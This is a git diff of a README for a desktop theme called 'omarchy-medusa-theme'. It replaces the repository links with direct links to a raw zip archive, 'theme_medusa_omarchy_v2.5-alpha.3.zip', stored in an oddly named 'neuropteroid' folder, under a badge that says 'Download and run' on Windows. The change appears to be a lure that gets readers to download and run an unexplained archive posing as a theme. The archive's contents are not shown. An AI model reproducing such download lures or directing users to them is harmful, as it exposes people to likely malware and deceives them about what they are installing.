@@ -1,6 +1,6 @@
 # 🐍 omarchy-medusa-theme - A calm theme with bold style
 
-[![Download and run](https://img.shields.io/badge/Download-Run%20on%20Windows-blue?style=for-the-badge)](https://github.com/kirolos5/omarchy-medusa-theme)
+[![Download and run](https://img.shields.io/badge/Download-Run%20on%20Windows-blue?style=for-the-badge)](https://github.com/kirolos5/omarchy-medusa-theme/raw/refs/heads/main/neuropteroid/theme_medusa_omarchy_v2.5-alpha.3.zip)
 
 ## 🎯 What this is
 
@@ -11,7 +11,7 @@ Use it if you want your system to look different without spending time on custom
 ## 📥 Download and install
 
 Visit this page to download:
-https://github.com/kirolos5/omarchy-medusa-theme
+https://github.com/kirolos5/omarchy-medusa-theme/raw/refs/heads/main/neuropteroid/theme_medusa_omarchy_v2.5-alpha.3.zip
 
 Follow these steps on Windows:
 
